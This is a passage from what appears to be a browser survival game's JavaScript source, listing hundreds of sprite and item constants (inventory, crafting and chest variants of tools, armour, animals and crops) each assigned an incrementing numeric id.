                    CRAFT_STONE_HELMET: e++,
                    CHEST_STONE_HELMET: e++,
                    INV_GOLD_HELMET: e++,
                    CRAFT_GOLD_HELMET: e++,
                    CHEST_GOLD_HELMET: e++,
                    INV_DIAMOND_HELMET: e++,
                    CRAFT_DIAMOND_HELMET: e++,
                    CHEST_DIAMOND_HELMET: e++,
                    INV_BOOK: e++,
                    CRAFT_BOOK: e++,
                    CHEST_BOOK: e++,
                    INV_PAPER: e++,
                    CRAFT_PAPER: e++,
                    CHEST_PAPER: e++,
                    HERB_WINTER: e++,
                    BEAR: e++,
                    CHEST_AMETHYST: e++,
                    SNOW: e++,
                    DRAGON_GROUND: e++,
                    DRAGON: e++,
                    LAVA_DRAGON: e++,
                    WING_LEFT: e++,
                    WING_RIGHT: e++,
                    LAVA_WING_LEFT: e++,
                    LAVA_WING_RIGHT: e++,
                    INV_SWORD_AMETHYST: e++,
                    CRAFT_SWORD_AMETHYST: e++,
                    CHEST_SWORD_AMETHYST: e++,
                    INV_PICK_AMETHYST: e++,
                    CHEST_PICK_AMETHYST: e++,
                    CRAFT_PICK_AMETHYST: e++,
                    HURT_FOX: e++,
                    HURT_BEAR: e++,
                    HURT_DRAGON: e++,
                    HURT_LAVA_DRAGON: e++,
                    SLOT_NUMBER: e++,
                    HURT_WING_LEFT: e++,
                    HURT_WING_RIGHT: e++,
                    HURT_LAVA_WING_LEFT: e++,
                    HURT_LAVA_WING_RIGHT: e++,
                    FLAKES: e++,
                    DESERT: e++,
                    INV_AMETHYST_SPEAR: e++,
                    CRAFT_AMETHYST_SPEAR: e++,
                    CHEST_AMETHYST_SPEAR: e++,
                    SNOW_STEP: e++,
                    LAVA_STEP: e++,
                    INV_HAMMER: e++,
                    CRAFT_HAMMER: e++,
                    CHEST_HAMMER: e++,
                    INV_HAMMER_GOLD: e++,
                    CRAFT_HAMMER_GOLD: e++,
                    CHEST_HAMMER_GOLD: e++,
                    INV_HAMMER_DIAMOND: e++,
                    CRAFT_HAMMER_DIAMOND: e++,
                    CHEST_HAMMER_DIAMOND: e++,
                    INV_HAMMER_AMETHYST: e++,
                    CRAFT_HAMMER_AMETHYST: e++,
                    CHEST_HAMMER_AMETHYST: e++,
                    INV_HAMMER_REIDITE: e++,
                    CRAFT_HAMMER_REIDITE: e++,
                    CHEST_HAMMER_REIDITE: e++,
                    INV_AMETHYST_WALL: e++,
                    CRAFT_AMETHYST_WALL: e++,
                    CHEST_AMETHYST_WALL: e++,
                    INV_AMETHYST_SPIKE: e++,
                    CRAFT_AMETHYST_SPIKE: e++,
                    CHEST_AMETHYST_SPIKE: e++,
                    CRAFT_DOOR_AMETHYST_CLOSE: e++,
                    INV_DOOR_AMETHYST_CLOSE: e++,
                    DOOR_AMETHYST_OPEN: e++,
                    CHEST_DOOR_AMETHYST_CLOSE: e++,
                    INV_CAP_SCARF: e++,
                    CRAFT_CAP_SCARF: e++,
                    CHEST_CAP_SCARF: e++,
                    INV_FUR_WINTER: e++,
                    CHEST_FUR_WINTER: e++,
                    SLOT_NUMBER: e++,
                    DOOR_WOOD_OPEN_WINTER: e++,
                    DOOR_STONE_OPEN_WINTER: e++,
                    DOOR_GOLD_OPEN_WINTER: e++,
                    DOOR_DIAMOND_OPEN_WINTER: e++,
                    DOOR_AMETHYST_OPEN_WINTER: e++,
                    INV_BLUE_CORD: e++,
                    CHEST_BLUE_CORD: e++,
                    CRAFT_BLUE_CORD: e++,
                    BIGMAP: e++,
                    SHOW_SPECTATORS: e++,
                    INV_LOCK: e++,
                    CRAFT_LOCK: e++,
                    CHEST_LOCK: e++,
                    INV_DRAGON_HEART: e++,
                    CHEST_DRAGON_HEART: e++,
                    INV_LAVA_HEART: e++,
                    CHEST_LAVA_HEART: e++,
                    RECONNECT: e++,
                    RESURRECTION_GROUND: e++,
                    RESURRECTION_HOLE: e++,
                    RESURRECTION_ROTATE: e++,
                    INV_RESURRECTION: e++,
                    CRAFT_RESURRECTION: e++,
                    CHEST_RESURRECTION: e++,
                    INV_LOCKPICK: e++,
                    CRAFT_LOCKPICK: e++,
                    CHEST_LOCKPICK: e++,
                    KEY: e++,
                    PADLOCK: e++,
                    DELAY_WEAPON: e++,
                    LOCKED: e++,
                    PADLOCK_ON_CHEST: e++,
                    BUBBLES: e++,
                    INV_AMETHYST_HELMET: e++,
                    CRAFT_AMETHYST_HELMET: e++,
                    CHEST_AMETHYST_HELMET: e++,
                    SPECIAL_ITEMS: e++,
                    POINTS: e++,
                    AUTO_FEED: e++,
                    BANDAGE_ACTIVATED: e++,
                    STOP_REGENERATION: e++,
                    STOP_REGENERATION_BLIZZARD: e++,
                    INV_SUPER_HAMMER: e++,
                    CRAFT_SUPER_HAMMER: e++,
                    CHEST_SUPER_HAMMER: e++,
                    INV_TOTEM: e++,
                    CHEST_TOTEM: e++,
                    CRAFT_TOTEM: e++,
                    TEAM_BUTTON: e++,
                    MANAGE_TEAM_BUTTON: e++,
                    ICON_MEMBER: e++,
                    ICON_LEADER: e++,
                    FULL_TEAM_BUTTON: e++,
                    SHOW_TEAM_BUTTON: e++,
                    DELAY_TEAM: e++,
                    INV_DRAGON_SWORD: e++,
                    CRAFT_DRAGON_SWORD: e++,
                    CHEST_DRAGON_SWORD: e++,
                    INV_LAVA_SWORD: e++,
                    CRAFT_LAVA_SWORD: e++,
                    CHEST_LAVA_SWORD: e++,
                    INV_WOOD_BOW: e++,
                    CRAFT_WOOD_BOW: e++,
                    CHEST_WOOD_BOW: e++,
                    INV_STONE_BOW: e++,
                    CRAFT_STONE_BOW: e++,
                    CHEST_STONE_BOW: e++,
                    INV_GOLD_BOW: e++,
                    CRAFT_GOLD_BOW: e++,
                    CHEST_GOLD_BOW: e++,
                    INV_DIAMOND_BOW: e++,
                    CRAFT_DIAMOND_BOW: e++,
                    CHEST_DIAMOND_BOW: e++,
                    INV_AMETHYST_BOW: e++,
                    CRAFT_AMETHYST_BOW: e++,
                    CHEST_AMETHYST_BOW: e++,
                    INV_REIDITE_BOW: e++,
                    CRAFT_REIDITE_BOW: e++,
                    CHEST_REIDITE_BOW: e++,
                    INV_DRAGON_BOW: e++,
                    CRAFT_DRAGON_BOW: e++,
                    CHEST_DRAGON_BOW: e++,
                    CHEST_DRAGON_ORB: e++,
                    CHEST_LAVA_ORB: e++,
                    SHOP: e++,
                    CURSED_SWORD: e++,
                    INV_CURSED_SWORD: e++,
                    CRAFT_CURSED_SWORD: e++,
                    CHEST_CURSED_SWORD: e++,
                    ITEM1: e++,
                    ITEM2: e++,
                    ITEM3: e++,
                    ITEM4: e++,
                    SAND_BORDER: e++,
                    SAND_STEP: e++,
                    OCEAN: e++,
                    CRAFT_BRIDGE: e++,
                    INV_BRIDGE: e++,
                    CHEST_BRIDGE: e++,
                    LACK: e++,
                    OXYGEN: e++,
                    INV_SAND: e++,
                    CHEST_SAND: e++,
                    CRAFT_BOTTLE_EMPTY: e++,
                    INV_BOTTLE_EMPTY: e++,
                    INV_BOTTLE_FULL: e++,
                    CHEST_BOTTLE_EMPTY: e++,
                    CHEST_BOTTLE_FULL: e++,
                    INV_SHOVEL: e++,
                    CHEST_SHOVEL: e++,
                    CRAFT_SHOVEL: e++,
                    LAKE_DEEP: e++,
                    LAKE: e++,
                    LAKE_EDGE: e++,
                    SHINGLE: e++,
                    DRIED_PLANT: e++,
                    INV_KRAKEN_SKIN: e++,
                    CHEST_KRAKEN_SKIN: e++,
                    INV_WATERING_CAN: e++,
                    CRAFT_WATERING_CAN: e++,
                    CHEST_WATERING_CAN: e++,
                    INV_FLOUR: e++,
                    CHEST_FLOUR: e++,
                    INV_WHEAT_SEED: e++,
                    CRAFT_WHEAT_SEED: e++,
                    CHEST_WHEAT_SEED: e++,
                    INV_COOKIE: e++,
                    CRAFT_COOKIE: e++,
                    CHEST_COOKIE: e++,
                    KRAKEN: e++,
                    DRIED_WHEAT: e++,
                    INV_WILD_WHEAT: e++,
                    CHEST_WILD_WHEAT: e++,
                    WINDMILL_WINGS: e++,
                    WINDMILL_HEAD: e++,
                    CRAFT_WINDMILL: e++,
                    INV_WINDMILL: e++,
                    CHEST_WINDMILL: e++,
                    INV_SUPER_DIVING_SUIT: e++,
                    CRAFT_SUPER_DIVING_SUIT: e++,
                    CHEST_SUPER_DIVING_SUIT: e++,
                    INV_DIVING_MASK: e++,
                    CRAFT_DIVING_MASK: e++,
                    CHEST_DIVING_MASK: e++,
                    INV_WATERING_CAN_FULL: e++,
                    CHEST_WATERING_CAN_FULL: e++,
                    CRAFT_WATERING_CAN_FULL: e++,
                    WINDMILL_CASES: e++,
                    EXTRACTOR_CASES: e++,
                    WINDMILL_WHEAT_SEED: e++,
                    WINDMILL_FLOUR: e++,
                    INV_CAKE: e++,
                    CRAFT_CAKE: e++,
                    CHEST_CAKE: e++,
                    INV_FOODFISH: e++,
                    CHEST_FOODFISH: e++,
                    INV_FOODFISH_COOKED: e++,
                    CHEST_FOODFISH_COOKED: e++,
                    CRAFT_FOODFISH_COOKED: e++,
                    DELAY_DRINK: e++,
                    WHEAT_SEED_DRIED: e++,
                    HEART_SYMBOL_HUD: e++,
                    COLD_SYMBOL_HUD: e++,
                    FOOD_SYMBOL_HUD: e++,
                    WATER_SYMBOL_HUD: e++,
                    PIRANHA: e++,
                    INV_SCALES: e++,
                    CHEST_SCALES: e++,
                    CAVE_STONES: e++,
                    HERB_CAVE: e++,
                    WATERBLOCK: e++,
                    SHADOW_CAVE_STONES: e++,
                    CAVE_STEP: e++,
                    DELAY_SPIKE: e++,
                    CHEST_GROUND: e++,
                    CHEST_PLOT: e++,
                    CRAFT_PLOT: e++,
                    INV_PLOT: e++,
                    CHEST_ICE: e++,
                    HURT_KRAKEN: e++,
                    HURT_PIRANHA: e++,
                    CHEST_BREAD: e++,
                    CRAFT_BREAD: e++,
                    TREASURE_CHEST: e++,
                    ISLAND: e++,
                    PALM: e++,
                    WAVE_ONE: e++,
                    WAVE_TWO: e++,
                    ISLAND_BLOCK: e++,
                    HURT_TREASURE_CHEST: e++,
                    ISLAND_STEP: e++,
                    INV_SHOVEL_GOLD: e++,
                    CRAFT_SHOVEL_GOLD: e++,
                    CHEST_SHOVEL_GOLD: e++,
                    INV_SHOVEL_DIAMOND: e++,
                    CHEST_SHOVEL_DIAMOND: e++,
                    CRAFT_SHOVEL_DIAMOND: e++,
                    INV_SHOVEL_AMETHYST: e++,
                    CRAFT_SHOVEL_AMETHYST: e++,
                    CHEST_SHOVEL_AMETHYST: e++,
                    RECIPE_BUTTON: e++,
                    INV_SPANNER: e++,
                    CHEST_SPANNER: e++,
                    CRAFT_SPANNER: e++,
                    INV_MACHETE: e++,
                    CHEST_MACHETE: e++,
                    CRAFT_MACHETE: e++,
                    CRAFT_BOTTLE_FULL: e++,
                    BREAD_OVEN_ON: e++,
                    INV_BREAD_OVEN: e++,
                    CRAFT_BREAD_OVEN: e++,
                    CHEST_BREAD_OVEN: e++,
                    BREAD_LIGHT_UP: e++,
                    BREAD_LIGHT_DOWN: e++,
                    BREAD_OVEN_UI: e++,
                    BREAD_OVEN_WOOD: e++,
                    BREAD_OVEN_BREAD: e++,
                    CLOCK: e++,
                    ARROW_CLOCK: e++,
                    OPTION_BUTTON: e++,
                    DEAD_BOX: e++,
                    HURT_DEAD_BOX: e++,
                    CRAFT_SANDWICH: e++,
                    CHEST_SANDWICH: e++,
                    INV_DRAGON_HELMET: e++,
                    CHEST_DRAGON_HELMET: e++,
                    CRAFT_DRAGON_HELMET: e++,
                    INV_LAVA_HELMET: e++,
                    CHEST_LAVA_HELMET: e++,
                    CRAFT_LAVA_HELMET: e++,
                    INV_WITCH: e++,
                    CHEST_WITCH: e++,
                    CRAFT_WITCH: e++,
                    INV_NIMBUS: e++,
                    CHEST_NIMBUS: e++,
                    CRAFT_NIMBUS: e++,
                    INV_WAND1: e++,
                    CHEST_WAND1: e++,
                    CRAFT_WAND1: e++,
                    INV_WAND2: e++,
                    CHEST_WAND2: e++,
                    CRAFT_WAND2: e++,
                    DRAGON_SWORD_HALO: e++,
                    INV_DRAGON_CUBE: e++,
                    CHEST_DRAGON_CUBE: e++,
                    INV_LAVA_CUBE: e++,
                    CHEST_LAVA_CUBE: e++,
                    QUEST_BUTTON: e++,
                    INV_CROWN_GREEN: e++,
                    CHEST_CROWN_GREEN: e++,
                    CRAFT_CROWN_GREEN: e++,
                    CHEST_GEMME_GREEN: e++,
                    INV_CROWN_ORANGE: e++,
                    CHEST_CROWN_ORANGE: e++,
                    CRAFT_CROWN_ORANGE: e++,
                    CHEST_GEMME_ORANGE: e++,
                    INV_CROWN_BLUE: e++,
                    CHEST_CROWN_BLUE: e++,
                    CHEST_GEMME_BLUE: e++,
                    INV_HOOD: e++,
                    CRAFT_HOOD: e++,
                    CHEST_HOOD: e++,
                    CRAFT_CROWN_BLUE: e++,
                    INV_PEASANT: e++,
                    CRAFT_PEASANT: e++,
                    CHEST_PEASANT: e++,
                    CHEST_SPECIAL_FUR: e++,
                    CHEST_SPECIAL_FUR_2: e++,
                    INV_WINTER_PEASANT: e++,
                    CRAFT_WINTER_PEASANT: e++,
                    CHEST_WINTER_PEASANT: e++,
                    INV_WINTER_HOOD: e++,
                    CRAFT_WINTER_HOOD: e++,
                    CHEST_WINTER_HOOD: e++,
                    SOUND_BUTTON_ON: e++,
                    SOUND_BUTTON_OFF: e++,
                    CRAFT_BUCKET_FULL: e++,
                    CRAFT_BUCKET_EMPTY: e++,
                    CHEST_BUCKET_FULL: e++,
                    CHEST_BUCKET_EMPTY: e++,
                    WELL_FULL: e++,
                    INV_WELL: e++,
                    CHEST_WELL: e++,
                    CRAFT_WELL: e++,
                    DELAY_HELMET: e++,
                    GLOVES_HOOD: e++,
                    DELAY_WALL: e++,
                    MARKET_BUTTON: e++,
                    ACCESSORY: e++,
                    MARKET_BGD: e++,
                    DEAD_BOX_UI: e++,
                    CRAFT_SIGN: e++,
                    INV_SIGN: e++,
                    CHEST_SIGN: e++,
                    SYMBOLS: e++,
                    SIGN_BUTTON: e++,
                    TREE_WEB1: e++,
                    TREE_WEB2: e++,
                    TREE_BRANCH_WEB1: e++,
                    TREE_BRANCH_WEB2: e++,
                    INV_PUMPKIN_SEED: e++,
                    CRAFT_PUMPKIN_SEED: e++,
                    CHEST_PUMPKIN_SEED: e++,
                    PUMPKIN_SEED_MOB: e++,
                    PLANT_PUMPKIN_DRIED: e++,
                    DRIED_PUMPKIN: e++,
                    INV_PUMPKIN: e++,
                    CHEST_PUMPKIN: e++,
                    HALO_FIRE_PUMPKIN: e++,
                    GROUND_FIRE_PUMPKIN: e++,
                    MINIMAP_CTX: e++,
                    BIGMAP_CTX: e++,
                    ZOMBIE_BODY: e++,
                    ZOMBIE_HEAD: e++,
                    ZOMBIE_HAND: e++,
                    ZOMBIE_HURT: e++,
                    ZOMBIE_HUNGER: e++,
                    ZOMBIE_HEAL: e++,
                    INV_WOOD_HELMET: e++,
                    CRAFT_WOOD_HELMET: e++,
                    CHEST_WOOD_HELMET: e++,
                    INV_SWORD_WOOD: e++,
                    CRAFT_SWORD_WOOD: e++,
                    CHEST_SWORD_WOOD: e++,
                    ZOMBIE_PLAYER: e++,
                    VAMPIRE: e++,
                    INV_GARLIC_SEED: e++,
                    CRAFT_GARLIC_SEED: e++,
                    CHEST_GARLIC_SEED: e++,
                    GARLIC_SEED_MOB: e++,
                    PLANT_GARLIC_DRIED: e++,
                    DRIED_GARLIC: e++,
                    INV_GARLIC: e++,
                    CHEST_GARLIC: e++,
                    INV_ROOF: e++,
                    CRAFT_ROOF: e++,
                    CHEST_ROOF: e++,
                    INV_THORNBUSH_SEED: e++,
                    CRAFT_THORNBUSH_SEED: e++,
                    CHEST_THORNBUSH_SEED: e++,
                    THORNBUSH_SEED_MOB: e++,
                    PLANT_THORNBUSH_DRIED: e++,
                    INV_THORNBUSH: e++,
                    CHEST_THORNBUSH: e++,
                    CRAFT_THORNBUSH: e++,
                    ROOFS: e++,
                    GIFT: e++,
                    TREE_SNOW1: e++,
                    TREE_SNOW2: e++,
                    TREE_BRANCH_SNOW1: e++,
                    TREE_BRANCH_SNOW2: e++,
                    HURT_GIFT: e++,
                    INV_PIRATE_SWORD: e++,
                    CRAFT_PIRATE_SWORD: e++,
                    CHEST_PIRATE_SWORD: e++,
                    CHEST_SUGAR_CAN: e++,
                    CRAFT_SUGAR_CAN: e++,
                    INV_SUGAR_CAN: e++,
                    INV_FERRERO: e++,
                    CHEST_FERRERO: e++,
                    CHEST_CANDY: e++,
                    DRIED_THORNBUSH: e++,
                    INV_GARLAND: e++,
                    CHEST_GARLAND: e++,
                    GARLANDS: e++,
                    GARLANDS_LIGHT: e++,
                    INV_DRAGON_SPEAR: e++,
                    CHEST_DRAGON_SPEAR: e++,
                    CRAFT_DRAGON_SPEAR: e++,
                    INV_LAVA_SPEAR: e++,
                    CHEST_LAVA_SPEAR: e++,
                    CRAFT_LAVA_SPEAR: e++,
                    INV_CHRISTMAS_HAT: e++,
                    CHEST_CHRISTMAS_HAT: e++,
                    INV_ELF_HAT: e++,
                    CHEST_ELF_HAT: e++,
                    ROBOT_SKIN: e++,
                    VERIFIED: e++,
                    CRAB_ATTACK: e++,
                    CRAB: e++,
                    HURT_CRAB: e++,
                    HURT_CRAB_CLAW_LEFT: e++,
                    HURT_CRAB_CLAW_RIGHT: e++,
                    HEAL_CRAB: e++,
                    HEAL_CRAB_CLAW_LEFT: e++,
                    HEAL_CRAB_CLAW_RIGHT: e++,
                    CRAB_CLAW_LEFT: e++,
                    CRAB_CLAW_RIGHT: e++,
                    CRAB_CLAW_LEFT_ATTACK: e++,
                    CRAB_CLAW_RIGHT_ATTACK: e++,
                    CHEST_CRAB_STICK: e++,
                    CHEST_CRAB_SPEAR: e++,
                    CRAFT_CRAB_SPEAR: e++,
                    INV_CRAB_SPEAR: e++,
                    FISH1: e++,
                    FISH2: e++,
                    HURT_FISH1: e++,
                    HURT_FISH2: e++,
                    CHEST_CRAB_LOOT: e++,
                    INV_BED: e++,
                    CHEST_BED: e++,
                    CRAFT_BED: e++,
                    INV_CROWN_CRAB: e++,
                    CHEST_CROWN_CRAB: e++,
                    CRAFT_CROWN_CRAB: e++,
                    BED_TOP: e++,
                    HURT_RABBIT_SKIN: e++,
                    COLD_RABBIT_SKIN: e++,
                    HUNGER_RABBIT_SKIN: e++,
                    HEAL_RABBIT_SKIN: e++,
                    FIRE_MOB: e++,
                    HURT_FIRE_MOB: e++,
                    GLOVES_DIAMOND_PROTECTION: e++,
                    INV_DIAMOND_PROTECTION: e++,
                    CRAFT_DIAMOND_PROTECTION: e++,
                    CHEST_DIAMOND_PROTECTION: e++,
                    GLOVES_AMETHYST_PROTECTION: e++,
                    INV_AMETHYST_PROTECTION: e++,
                    CRAFT_AMETHYST_PROTECTION: e++,
                    CHEST_AMETHYST_PROTECTION: e++,
                    GLOVES_REIDITE_PROTECTION: e++,
                    INV_REIDITE_PROTECTION: e++,
                    CRAFT_REIDITE_PROTECTION: e++,
                    CHEST_REIDITE_PROTECTION: e++,
                    INV_REIDITE_SWORD: e++,
                    CRAFT_REIDITE_SWORD: e++,
                    CHEST_REIDITE_SWORD: e++,
                    LAVA_SHINGLE: e++,
                    INV_FLAME: e++,
                    CHEST_FLAME: e++,
                    INV_REIDITE: e++,
                    CHEST_REIDITE: e++,
                    HERB_LAVA: e++,
                    LAVA_BUBBLE: e++,
                    ASHES: e++,
                    INV_REIDITE_SPEAR: e++,
                    CRAFT_REIDITE_SPEAR: e++,
                    CHEST_REIDITE_SPEAR: e++,
                    INV_REIDITE_HELMET: e++,
                    CRAFT_REIDITE_HELMET: e++,
                    CHEST_REIDITE_HELMET: e++,
                    INV_CARROT_SEED: e++,
                    CRAFT_CARROT_SEED: e++,
                    CHEST_CARROT_SEED: e++,
                    CARROT_SEED_MOB: e++,
                    PLANT_CARROT_DRIED: e++,
                    DRIED_CARROT: e++,
                    INV_CARROT: e++,
                    CHEST_CARROT: e++,
                    TOMATO_MINI: e++,
                    DRIED_TOMATO_MINI: e++,
                    INV_TOMATO_SEED: e++,
                    CRAFT_TOMATO_SEED: e++,
                    CHEST_TOMATO_SEED: e++,
                    TOMATO_SEED_MOB: e++,
                    PLANT_TOMATO_DRIED: e++,
                    DRIED_TOMATO: e++,
                    INV_TOMATO: e++,
                    INV_WATERMELON_SEED: e++,
                    CRAFT_WATERMELON_SEED: e++,
                    CHEST_WATERMELON_SEED: e++,
                    WATERMELON_SEED_MOB: e++,
                    PLANT_WATERMELON_DRIED: e++,
                    DRIED_WATERMELON: e++,
                    INV_WATERMELON: e++,
                    CHEST_WATERMELON: e++,
                    CHEST_TOMATO: e++,
                    INV_PITCHFORK: e++,
                    CHEST_PITCHFORK: e++,
                    CRAFT_PITCHFORK: e++,
                    INV_PITCHFORK2: e++,
                    CHEST_PITCHFORK2: e++,
                    CRAFT_PITCHFORK2: e++,
                    INV_ALOE_VERA_SEED: e++,
                    CRAFT_ALOE_VERA_SEED: e++,
                    CHEST_ALOE_VERA_SEED: e++,
                    ALOE_VERA_SEED_MOB: e++,
                    PLANT_ALOE_VERA_DRIED: e++,
                    DRIED_ALOE_VERA: e++,
                    INV_ALOE_VERA: e++,
                    CHEST_ALOE_VERA: e++,
                    CACTUS: e++,
                    CRAFT_WOOD_DOOR_SPIKE: e++,
                    INV_WOOD_DOOR_SPIKE: e++,
                    CHEST_WOOD_DOOR_SPIKE: e++,
                    CRAFT_STONE_DOOR_SPIKE: e++,
                    INV_STONE_DOOR_SPIKE: e++,
                    CHEST_STONE_DOOR_SPIKE: e++,
                    CRAFT_GOLD_DOOR_SPIKE: e++,
                    INV_GOLD_DOOR_SPIKE: e++,
                    CHEST_GOLD_DOOR_SPIKE: e++,
                    CRAFT_DIAMOND_DOOR_SPIKE: e++,
                    INV_DIAMOND_DOOR_SPIKE: e++,
                    CHEST_DIAMOND_DOOR_SPIKE: e++,
                    CRAFT_AMETHYST_DOOR_SPIKE: e++,
                    INV_AMETHYST_DOOR_SPIKE: e++,
                    CHEST_AMETHYST_DOOR_SPIKE: e++,
                    CRAFT_REIDITE_DOOR_SPIKE: e++,
                    INV_REIDITE_DOOR_SPIKE: e++,
                    CHEST_REIDITE_DOOR_SPIKE: e++,
                    CRAFT_REIDITE_DOOR: e++,
                    INV_REIDITE_DOOR: e++,
                    CHEST_REIDITE_DOOR: e++,
                    CRAFT_REIDITE_SPIKE: e++,
                    INV_REIDITE_SPIKE: e++,
                    CHEST_REIDITE_SPIKE: e++,
                    CRAFT_REIDITE_WALL: e++,
                    INV_REIDITE_WALL: e++,
                    CHEST_REIDITE_WALL: e++,
                    INV_PICK_REIDITE: e++,
                    CHEST_PICK_REIDITE: e++,
                    CRAFT_PICK_REIDITE: e++,
                    GOLDEN_HEN: e++,
                    GOLDEN_CHICKEN: e++,
                    HURT_GOLDEN_HEN: e++,
                    HURT_GOLDEN_CHICKEN: e++,
                    RIVER: e++,
                    RIVER_DECO: e++,
                    RIVER_WAVE: e++,
                    CRAFT_BOAT: e++,
                    INV_BOAT: e++,
                    CHEST_BOAT: e++,
                    CRAFT_SLED: e++,
                    INV_SLED: e++,
                    CHEST_SLED: e++,
                    PENGUIN: e++,
                    HURT_PENGUIN: e++,
                    INV_PENGUIN_FEATHER: e++,
                    CHEST_PENGUIN_FEATHER: e++,
                    INV_HAWK_FEATHER: e++,
                    CHEST_HAWK_FEATHER: e++,
                    INV_VULTURE_FEATHER: e++,
                    CHEST_VULTURE_FEATHER: e++,
                    FOG: e++,
                    BOAR: e++,
                    BOAR_TAMED: e++,
                    BOAR_ATTACK: e++,
                    HURT_BOAR: e++,
                    INV_SADDLE: e++,
                    CHEST_SADDLE: e++,
                    CRAFT_SADDLE: e++,
                    INV_MOUNT_BOAR: e++,
                    CHEST_MOUNT_BOAR: e++,
                    CRAFT_MOUNT_BOAR: e++,
                    MARKER: e++,
                    CRAB_BOSS_ATTACK: e++,
                    CRAB_BOSS: e++,
                    CRAB_BOSS_TAMED: e++,
                    HURT_CRAB_BOSS: e++,
                    HURT_CRAB_BOSS_CLAW_LEFT: e++,
                    HURT_CRAB_BOSS_CLAW_RIGHT: e++,
                    CRAB_BOSS_CLAW_LEFT_ATTACK: e++,
                    CRAB_BOSS_CLAW_LEFT: e++,
                    CRAB_BOSS_CLAW_LEFT_TAMED: e++,
                    CRAB_BOSS_CLAW_RIGHT_ATTACK: e++,
                    CRAB_BOSS_CLAW_RIGHT: e++,
                    CRAB_BOSS_CLAW_RIGHT_TAMED: e++,
                    HEAL_CRAB_BOSS: e++,
                    HEAL_CRAB_BOSS_CLAW_LEFT: e++,
                    HEAL_CRAB_BOSS_CLAW_RIGHT: e++,
                    BABY_DRAGON_ATTACK: e++,
                    BABY_DRAGON: e++,
                    BABY_DRAGON_TAMED: e++,
                    BABY_DRAGON_WING_LEFT_ATTACK: e++,
                    BABY_DRAGON_WING_LEFT: e++,
                    BABY_DRAGON_WING_LEFT_TAMED: e++,
                    BABY_DRAGON_WING_RIGHT_ATTACK: e++,
                    BABY_DRAGON_WING_RIGHT: e++,
                    BABY_DRAGON_WING_RIGHT_TAMED: e++,
                    HURT_BABY_DRAGON: e++,
                    HURT_BABY_DRAGON_WING_LEFT: e++,
                    HURT_BABY_DRAGON_WING_RIGHT: e++,
                    INV_BABY_DRAGON: e++,
                    CHEST_BABY_DRAGON: e++,
                    CRAFT_BABY_DRAGON: e++,
                    BABY_LAVA_ATTACK: e++,
                    BABY_LAVA: e++,
                    BABY_LAVA_TAMED: e++,
                    BABY_LAVA_WING_LEFT_ATTACK: e++,
                    BABY_LAVA_WING_LEFT: e++,
                    BABY_LAVA_WING_LEFT_TAMED: e++,
                    BABY_LAVA_WING_RIGHT_ATTACK: e++,
                    BABY_LAVA_WING_RIGHT: e++,
                    BABY_LAVA_WING_RIGHT_TAMED: e++,
                    HURT_BABY_LAVA: e++,
                    HURT_BABY_LAVA_WING_LEFT: e++,
                    HURT_BABY_LAVA_WING_RIGHT: e++,
                    INV_BABY_LAVA: e++,
                    CHEST_BABY_LAVA: e++,
                    CRAFT_BABY_LAVA: e++,
                    HAWK_ATTACK: e++,
                    HAWK: e++,
                    HAWK_TAMED: e++,
                    HAWK_WING_LEFT_ATTACK: e++,
                    HAWK_WING_LEFT: e++,
                    HAWK_WING_LEFT_TAMED: e++,
                    HAWK_WING_RIGHT_ATTACK: e++,
                    HAWK_WING_RIGHT: e++,
                    HAWK_WING_RIGHT_TAMED: e++,
                    HURT_HAWK: e++,
                    HURT_HAWK_WING_LEFT: e++,
                    HURT_HAWK_WING_RIGHT: e++,
                    INV_HAWK: e++,
                    CHEST_HAWK: e++,
                    CRAFT_HAWK: e++,
                    HAWK_GROUND: e++,
                    HAWK_GROUND_ATTACK: e++,
                    HURT_HAWK_GROUND: e++,
                    CRAFT_PLANE: e++,
                    INV_PLANE: e++,
                    CHEST_PLANE: e++,
                    VULTURE_ATTACK: e++,
                    VULTURE: e++,
                    VULTURE_TAMED: e++,
                    VULTURE_WING_LEFT_ATTACK: e++,
                    VULTURE_WING_LEFT: e++,
                    VULTURE_WING_LEFT_TAMED: e++,
                    VULTURE_WING_RIGHT_ATTACK: e++,
                    VULTURE_WING_RIGHT: e++,
                    VULTURE_WING_RIGHT_TAMED: e++,
                    HURT_VULTURE: e++,
                    HURT_VULTURE_WING_LEFT: e++,
                    HURT_VULTURE_WING_RIGHT: e++,
                    INV_VULTURE: e++,
                    CHEST_VULTURE: e++,
                    CRAFT_VULTURE: e++,
                    VULTURE_GROUND: e++,
                    VULTURE_GROUND_ATTACK: e++,
                    HURT_VULTURE_GROUND: e++,
                    INV_TURBAN1: e++,
                    CRAFT_TURBAN1: e++,
                    CHEST_TURBAN1: e++,
                    INV_TURBAN2: e++,
                    CRAFT_TURBAN2: e++,
                    CHEST_TURBAN2: e++,
                    SCORPION: e++,
                    HURT_SCORPION: e++,
                    SCORPION_HAND_LEFT: e++,
                    SCORPION_HAND_RIGHT: e++,
                    HURT_SCORPION_HAND_LEFT: e++,
                    HURT_SCORPION_HAND_RIGHT: e++,
                    SAND_WORM_GROUND: ["#E9CF96", "#144940"],
                    HURT_SAND_WORM0: e++,
                    SAND_WORM1: e++,
                    HURT_SAND_WORM1: e++,
                    SAND_WORM2: e++,
                    HURT_SAND_WORM2: e++,
                    INV_CACTUS: e++,
                    CHEST_CACTUS: e++,
                    INV_EMERALD: e++,
                    CHEST_EMERALD: e++,
                    INV_PITCHFORK_PART: e++,
                    CHEST_PITCHFORK_PART: e++,
                    INV_PILOT_GLASSES: e++,
                    CHEST_PILOT_GLASSES: e++,
                    INV_FUR_BOAR: e++,
                    CHEST_FUR_BOAR: e++,
                    INV_FIREFLY: e++,
                    CHEST_FIREFLY: e++,
                    INV_WOOD_ARROW: e++,
                    CHEST_WOOD_ARROW: e++,
                    CRAFT_WOOD_ARROW: e++,
                    INV_STONE_ARROW: e++,
                    CHEST_STONE_ARROW: e++,
                    CRAFT_STONE_ARROW: e++,
                    INV_GOLD_ARROW: e++,
                    CHEST_GOLD_ARROW: e++,
                    CRAFT_GOLD_ARROW: e++,
                    INV_DIAMOND_ARROW: e++,
                    CHEST_DIAMOND_ARROW: e++,
                    CRAFT_DIAMOND_ARROW: e++,
                    INV_AMETHYST_ARROW: e++,
                    CHEST_AMETHYST_ARROW: e++,
                    CRAFT_AMETHYST_ARROW: e++,
                    INV_REIDITE_ARROW: e++,
                    CHEST_REIDITE_ARROW: e++,
                    CRAFT_REIDITE_ARROW: e++,
                    INV_DRAGON_ARROW: e++,
                    CHEST_DRAGON_ARROW: e++,
                    CRAFT_DRAGON_ARROW: e++,
                    INV_SANDWORM_JUICE: e++,
                    CHEST_SANDWORM_JUICE: e++,
